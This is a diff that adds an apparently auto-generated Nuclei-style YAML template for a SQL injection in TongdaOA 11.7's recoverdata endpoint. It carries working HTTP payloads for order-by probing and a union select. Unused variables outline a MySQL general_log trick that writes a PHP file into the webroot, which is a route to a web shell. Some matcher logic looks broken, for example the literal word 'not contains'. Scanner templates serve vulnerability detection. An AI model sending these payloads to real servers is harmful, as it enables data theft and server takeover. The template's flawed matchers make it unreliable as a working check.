@@ -1,0 +1,67 @@
+id: tongdaoa-sql-injection
+info:
+  name: TongdaOA 11.7 SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    TongdaOA 11.7 has a SQL injection vulnerability in the `recoverdata` method. Exploitation allows attackers to retrieve sensitive data or gain server permissions.
+  reference:
+    - https://www.tongda2000.com
+http:
+  - raw:
+      - |
+        POST /general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key[0][formId][0)+and+1%3d%60%3d'%60%201}+order by 1%23%27]=1&item=1&
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "not contains"
+  - raw:
+      - |
+        POST /general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key[0][formId][0)+and+1%3d%60%3d'%60%201}+order by 100%23%27]=1&item=1&
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "An internal server error occurred"
+  - raw:
+      - |
+        POST /general/appbuilder/web/appcenter/appdata/recoverdata?test=/portal/gateway/doprint HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key[0][formId][0)+and+1%3d%60%3d'%60%201} union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32%23%27]=1&item=1&
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "\\d+"
+variables:
+  cmd: "echo 123456"
+  filename: "aaaa.php"
+  root_path: "D:/MYOA/webroot"
+  code: "202cb962ac59075b964b07152d234b70"
+  log_data:
+    - "key[0][formId][0)+and+1%3d%60%3d'%60%201};set global general_log%3doff;%23%27]=1&item=1&"
+    - "key[0][formId][0)+and+1%3d%60%3d'%60%201};set global general_log_file%3d'{{root_path}}/{{filename}}';%23%27]=1&item=1&"
+flow: |
+  http(1) && http(2) && http(3)
